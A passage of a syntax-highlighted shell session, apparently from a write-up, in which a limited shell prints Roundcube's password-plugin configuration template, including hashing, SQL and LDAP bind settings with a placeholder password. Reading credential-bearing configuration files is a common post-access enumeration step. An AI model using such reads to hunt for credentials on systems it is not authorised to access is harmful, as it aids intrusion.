class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br></pre></td><td class="code"><pre><span class="line">$ CAT config.inc.php.dist</span><br><span class="line">sh: 16: CAT: not found</span><br><span class="line">$ <span class="built_in">cat</span> config.inc.php.dist</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// Password Plugin options</span><br><span class="line">// -----------------------</span><br><span class="line">// A driver to use <span class="keyword">for</span> password change. Default: <span class="string">&quot;sql&quot;</span>.</span><br><span class="line">// See README file <span class="keyword">for</span> list of supported driver names.</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_driver&#x27;</span>] = <span class="string">&#x27;sql&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// A driver to use <span class="keyword">for</span> checking password strength. Default: null (disabled).</span><br><span class="line">// See README file <span class="keyword">for</span> list of supported driver names.</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_strength_driver&#x27;</span>] = null;</span><br><span class="line"></span><br><span class="line">// Determine whether current password is required to change password.</span><br><span class="line">// Default: <span class="literal">false</span>.</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_confirm_current&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">// Require the new password to be a certain length.</span><br><span class="line">// <span class="built_in">set</span> to blank to allow passwords of any length</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_minimum_length&#x27;</span>] = 8;</span><br><span class="line"></span><br><span class="line">// Require the new password to have at least the specified strength score.</span><br><span class="line">// Note: Password strength is scored from 1 (week) to 5 (strong).</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_minimum_score&#x27;</span>] = 0;</span><br><span class="line"></span><br><span class="line">// Enables logging of password changes into logs/password</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_log&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">// Array of login exceptions <span class="keyword">for</span> <span class="built_in">which</span> password change</span><br><span class="line">// will be not available (no Password tab <span class="keyword">in</span> Settings)</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_login_exceptions&#x27;</span>] = null;</span><br><span class="line"></span><br><span class="line">// Array of hosts that support password changing.</span><br><span class="line">// Listed hosts will feature a Password option <span class="keyword">in</span> Settings; others will not.</span><br><span class="line">// Example: [<span class="string">&#x27;mail.example.com&#x27;</span>, <span class="string">&#x27;mail2.example.org&#x27;</span>];</span><br><span class="line">// Default is NULL (all hosts supported).</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_hosts&#x27;</span>] = null;</span><br><span class="line"></span><br><span class="line">// Enables saving the new password even <span class="keyword">if</span> it matches the old password. Useful</span><br><span class="line">// <span class="keyword">for</span> upgrading the stored passwords after the encryption scheme has changed.</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_force_save&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">// Enables forcing new <span class="built_in">users</span> to change their password at their first login.</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_force_new_user&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">// Password hashing/crypting algorithm.</span><br><span class="line">// Possible options: des-crypt, ext-des-crypt, md5-crypt, blowfish-crypt,</span><br><span class="line">// sha256-crypt, sha512-crypt, md5, sha, smd5, ssha, ssha256, ssha512, samba, ad, dovecot, clear.</span><br><span class="line">// Also supported are password_hash() algoriths: hash-bcrypt, hash-argon2i, hash-argon2id.</span><br><span class="line">// Default: <span class="string">&#x27;clear&#x27;</span> (no hashing)</span><br><span class="line">// For details see password::hash_password() method.</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_algorithm&#x27;</span>] = <span class="string">&#x27;clear&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// Additional options <span class="keyword">for</span> password hashing <span class="keyword">function</span>(s).</span><br><span class="line">// For password_hash()-based passwords see https://www.php.net/manual/en/function.password-hash.php</span><br><span class="line">// It can be used to <span class="built_in">set</span> the Blowfish algorithm cost, e.g. [<span class="string">&#x27;cost&#x27;</span> =&gt; 12]</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_algorithm_options&#x27;</span>] = [];</span><br><span class="line"></span><br><span class="line">// Password prefix (e.g. &#123;CRYPT&#125;, &#123;SHA&#125;) <span class="keyword">for</span> passwords generated</span><br><span class="line">// using password_algorithm above. Default: empty.</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_algorithm_prefix&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// Path <span class="keyword">for</span> dovecotpw/doveadm-pw (<span class="keyword">if</span> not <span class="keyword">in</span> the <span class="variable">$PATH</span>).</span><br><span class="line">// Used <span class="keyword">for</span> password_algorithm = <span class="string">&#x27;dovecot&#x27;</span>.</span><br><span class="line">// <span class="variable">$config</span>[<span class="string">&#x27;password_dovecotpw&#x27;</span>] = <span class="string">&#x27;/usr/local/sbin/doveadm pw&#x27;</span>; // <span class="keyword">for</span> dovecot-2.x</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_dovecotpw&#x27;</span>] = <span class="string">&#x27;/usr/local/sbin/dovecotpw&#x27;</span>; // <span class="keyword">for</span> dovecot-1.x</span><br><span class="line"></span><br><span class="line">// Dovecot password scheme.</span><br><span class="line">// Used <span class="keyword">for</span> password_algorithm = <span class="string">&#x27;dovecot&#x27;</span>.</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_dovecotpw_method&#x27;</span>] = <span class="string">&#x27;CRAM-MD5&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// Enables use of password with method prefix, e.g. &#123;MD5&#125;$1$LUiMYWqx<span class="variable">$fEkg</span>/ggr/L6Mb2X7be4i1/</span><br><span class="line">// when using password_algorithm=dovecot</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_dovecotpw_with_method&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">// Number of rounds <span class="keyword">for</span> the sha256 and sha512 crypt hashing algorithms.</span><br><span class="line">// Must be at least 1000. If not <span class="built_in">set</span>, <span class="keyword">then</span> the number of rounds is left up</span><br><span class="line">// to the crypt() implementation. On glibc this defaults to 5000.</span><br><span class="line">// Be aware, the higher the value, the longer it takes to generate the password hashes.</span><br><span class="line">//<span class="variable">$config</span>[<span class="string">&#x27;password_crypt_rounds&#x27;</span>] = 50000;</span><br><span class="line"></span><br><span class="line">// This option temporarily disables the password change functionality.</span><br><span class="line">// Use it when the <span class="built_in">users</span> database server is <span class="keyword">in</span> maintenance mode or something like that.</span><br><span class="line">// You can <span class="built_in">set</span> it to TRUE/FALSE or a text describing the reason</span><br><span class="line">// <span class="built_in">which</span> will replace the default.</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_disabled&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">// Various drivers/setups use different format of the username.</span><br><span class="line">// This option allows you to force specified format use. Default: <span class="string">&#x27;%u&#x27;</span>.</span><br><span class="line">// Supported variables:</span><br><span class="line">//     %u - full username,</span><br><span class="line">//     %l - the <span class="built_in">local</span> part of the username (<span class="keyword">in</span> <span class="keyword">case</span> the username is an email address)</span><br><span class="line">//     %d - the domain part of the username (<span class="keyword">in</span> <span class="keyword">case</span> the username is an email address)</span><br><span class="line">// Note: This may no apply to some drivers implementing their own rules, e.g. sql.</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_username_format&#x27;</span>] = <span class="string">&#x27;%u&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// Options passed when creating Guzzle HTTP client, used to access various external APIs.</span><br><span class="line">// This will overwrite global http_client settings. For example:</span><br><span class="line">// [</span><br><span class="line">//   <span class="string">&#x27;timeout&#x27;</span> =&gt; 10,</span><br><span class="line">//   <span class="string">&#x27;proxy&#x27;</span> =&gt; <span class="string">&#x27;tcp://localhost:8125&#x27;</span>,</span><br><span class="line">// ]</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_http_client&#x27;</span>] = [];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// SQL Driver options</span><br><span class="line">// ------------------</span><br><span class="line">// PEAR database DSN <span class="keyword">for</span> performing the query. By default</span><br><span class="line">// Roundcube DB settings are used.</span><br><span class="line">// Supported replacement variables:</span><br><span class="line">// %h - user<span class="string">&#x27;s IMAP hostname</span></span><br><span class="line"><span class="string">// %n - hostname ($_SERVER[&#x27;</span>SERVER_NAME<span class="string">&#x27;])</span></span><br><span class="line"><span class="string">// %t - hostname without the first part</span></span><br><span class="line"><span class="string">// %d - domain (http hostname $_SERVER[&#x27;</span>HTTP_HOST<span class="string">&#x27;] without the first part)</span></span><br><span class="line"><span class="string">// %z - IMAP domain (IMAP hostname without the first part)</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_db_dsn<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// The SQL query used to change the password.</span></span><br><span class="line"><span class="string">// The query can contain the following macros that will be expanded as follows:</span></span><br><span class="line"><span class="string">//      %p is replaced with the plaintext new password</span></span><br><span class="line"><span class="string">//      %P is replaced with the crypted/hashed new password</span></span><br><span class="line"><span class="string">//         according to configured password_algorithm</span></span><br><span class="line"><span class="string">//      %o is replaced with the old (current) password</span></span><br><span class="line"><span class="string">//      %O is replaced with the crypted/hashed old (current) password</span></span><br><span class="line"><span class="string">//         according to configured password_algorithm</span></span><br><span class="line"><span class="string">//      %h is replaced with the imap host (from the session info)</span></span><br><span class="line"><span class="string">//      %u is replaced with the username (from the session info)</span></span><br><span class="line"><span class="string">//      %l is replaced with the local part of the username</span></span><br><span class="line"><span class="string">//         (in case the username is an email address)</span></span><br><span class="line"><span class="string">//      %d is replaced with the domain part of the username</span></span><br><span class="line"><span class="string">//         (in case the username is an email address)</span></span><br><span class="line"><span class="string">// Escaping of macros is handled by this module.</span></span><br><span class="line"><span class="string">// Default: &quot;SELECT update_passwd(%P, %u)&quot;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_query<span class="string">&#x27;] = &#x27;</span>SELECT update_passwd(%P, %u)<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// By default domains in variables are using unicode.</span></span><br><span class="line"><span class="string">// Enable this option to use punycoded names</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_idn_ascii<span class="string">&#x27;] = false;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Poppassd Driver options</span></span><br><span class="line"><span class="string">// -----------------------</span></span><br><span class="line"><span class="string">// The host which changes the password (default: localhost)</span></span><br><span class="line"><span class="string">// Supported replacement variables:</span></span><br><span class="line"><span class="string">//   %n - hostname ($_SERVER[&#x27;</span>SERVER_NAME<span class="string">&#x27;])</span></span><br><span class="line"><span class="string">//   %t - hostname without the first part</span></span><br><span class="line"><span class="string">//   %d - domain (http hostname $_SERVER[&#x27;</span>HTTP_HOST<span class="string">&#x27;] without the first part)</span></span><br><span class="line"><span class="string">//   %h - IMAP host</span></span><br><span class="line"><span class="string">//   %z - IMAP domain without first part</span></span><br><span class="line"><span class="string">//   %s - domain name after the &#x27;</span>@<span class="string">&#x27; from e-mail address provided at login screen</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_pop_host<span class="string">&#x27;] = &#x27;</span>localhost<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// TCP port used for poppassd connections (default: 106)</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_pop_port<span class="string">&#x27;] = 106;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// SASL Driver options</span></span><br><span class="line"><span class="string">// -------------------</span></span><br><span class="line"><span class="string">// Additional arguments for the saslpasswd2 call</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_saslpasswd_args<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP, LDAP_SIMPLE and LDAP_EXOP Driver options</span></span><br><span class="line"><span class="string">// -----------------------------------</span></span><br><span class="line"><span class="string">// LDAP server name to connect to.</span></span><br><span class="line"><span class="string">// You can provide one or several hosts in an array in which case the hosts are tried from left to right.</span></span><br><span class="line"><span class="string">// Example: [&#x27;</span>ldap1.example.com<span class="string">&#x27;, &#x27;</span>ldap2.example.com<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">// Default: &#x27;</span>localhost<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_host<span class="string">&#x27;] = &#x27;</span>localhost<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP server port to connect to</span></span><br><span class="line"><span class="string">// Default: &#x27;</span>389<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_port<span class="string">&#x27;] = &#x27;</span>389<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// TLS is started after connecting</span></span><br><span class="line"><span class="string">// Using TLS for password modification is recommended.</span></span><br><span class="line"><span class="string">// Default: false</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_starttls<span class="string">&#x27;] = false;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP version</span></span><br><span class="line"><span class="string">// Default: &#x27;</span>3<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_version<span class="string">&#x27;] = &#x27;</span>3<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP base name (root directory)</span></span><br><span class="line"><span class="string">// Example: &#x27;</span>dc=example,dc=com<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_basedn<span class="string">&#x27;] = &#x27;</span>dc=example,dc=com<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP connection method</span></span><br><span class="line"><span class="string">// There are two connection methods for changing a user&#x27;</span>s LDAP password.</span><br><span class="line">// <span class="string">&#x27;user&#x27;</span>: use user credential (recommended, require password_confirm_current=<span class="literal">true</span>)</span><br><span class="line">// <span class="string">&#x27;admin&#x27;</span>: use admin credential (this mode require password_ldap_adminDN and password_ldap_adminPW)</span><br><span class="line">// Default: <span class="string">&#x27;user&#x27;</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_ldap_method&#x27;</span>] = <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// LDAP Admin DN</span><br><span class="line">// Used only <span class="keyword">in</span> admin connection mode</span><br><span class="line">// Default: null</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_ldap_adminDN&#x27;</span>] = null;</span><br><span class="line"></span><br><span class="line">// LDAP Admin Password</span><br><span class="line">// Used only <span class="keyword">in</span> admin connection mode</span><br><span class="line">// Default: null</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_ldap_adminPW&#x27;</span>] = null;</span><br><span class="line"></span><br><span class="line">// LDAP user DN mask</span><br><span class="line">// The user<span class="string">&#x27;s DN is mandatory and as we only have his login,</span></span><br><span class="line"><span class="string">// we need to re-create his DN using a mask</span></span><br><span class="line"><span class="string">// &#x27;</span>%login<span class="string">&#x27; will be replaced by the current roundcube user&#x27;</span>s login</span><br><span class="line">// <span class="string">&#x27;%name&#x27;</span> will be replaced by the current roundcube user<span class="string">&#x27;s name part</span></span><br><span class="line"><span class="string">// &#x27;</span>%domain<span class="string">&#x27; will be replaced by the current roundcube user&#x27;</span>s domain part</span><br><span class="line">// <span class="string">&#x27;%dc&#x27;</span> will be replaced by domain name hierarchal string e.g. <span class="string">&quot;dc=test,dc=domain,dc=com&quot;</span></span><br><span class="line">// Example: <span class="string">&#x27;uid=%login,ou=people,dc=example,dc=com&#x27;</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_ldap_userDN_mask&#x27;</span>] = <span class="string">&#x27;uid=%login,ou=people,dc=example,dc=com&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// LDAP search DN</span><br><span class="line">// The DN roundcube should <span class="built_in">bind</span> with to find out user<span class="string">&#x27;s DN</span></span><br><span class="line"><span class="string">// based on his login. Note that you should comment out the default</span></span><br><span class="line"><span class="string">// password_ldap_userDN_mask setting for this to take effect.</span></span><br><span class="line"><span class="string">// Use this if you cannot specify a general template for user DN with</span></span><br><span class="line"><span class="string">// password_ldap_userDN_mask. You need to perform a search based on</span></span><br><span class="line"><span class="string">// users login to find his DN instead. A common reason might be that</span></span><br><span class="line"><span class="string">// your users are placed under different ou&#x27;</span>s like engineering or</span><br><span class="line">// sales <span class="built_in">which</span> cannot be derived from their login only.</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_ldap_searchDN&#x27;</span>] = <span class="string">&#x27;cn=roundcube,ou=services,dc=example,dc=com&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// LDAP search password</span><br><span class="line">// If password_ldap_searchDN is <span class="built_in">set</span>, the password to use <span class="keyword">for</span></span><br><span class="line">// binding to search <span class="keyword">for</span> user<span class="string">&#x27;s DN. Note that you should comment out the default</span></span><br><span class="line"><span class="string">// password_ldap_userDN_mask setting for this to take effect.</span></span><br><span class="line"><span class="string">// Warning: Be sure to set appropriate permissions on this file so this password</span></span><br><span class="line"><span class="string">// is only accessible to roundcube and don&#x27;</span>t forget to restrict roundcube<span class="string">&#x27;s access to</span></span><br><span class="line"><span class="string">// your directory as much as possible using ACLs. Should this password be compromised</span></span><br><span class="line"><span class="string">// you want to minimize the damage.</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_searchPW<span class="string">&#x27;] = &#x27;</span>secret<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP search base</span></span><br><span class="line"><span class="string">// If password_ldap_searchDN is set, the base to search in using the filter below.</span></span><br><span class="line"><span class="string">// Note that you should comment out the default password_ldap_userDN_mask setting</span></span><br><span class="line"><span class="string">// for this to take effect.</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_search_base<span class="string">&#x27;] = &#x27;</span>ou=people,dc=example,dc=com<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP search filter</span></span><br><span class="line"><span class="string">// If password_ldap_searchDN is set, the filter to use when</span></span><br><span class="line"><span class="string">// searching for user&#x27;</span>s DN. Note that you should comment out the default</span><br><span class="line">// password_ldap_userDN_mask setting <span class="keyword">for</span> this to take effect.</span><br><span class="line">// <span class="string">&#x27;%login&#x27;</span> will be replaced by the current roundcube user<span class="string">&#x27;s login</span></span><br><span class="line"><span class="string">// &#x27;</span>%name<span class="string">&#x27; will be replaced by the current roundcube user&#x27;</span>s name part</span><br><span class="line">// <span class="string">&#x27;%domain&#x27;</span> will be replaced by the current roundcube user<span class="string">&#x27;s domain part</span></span><br><span class="line"><span class="string">// &#x27;</span>%dc<span class="string">&#x27; will be replaced by domain name hierarchal string 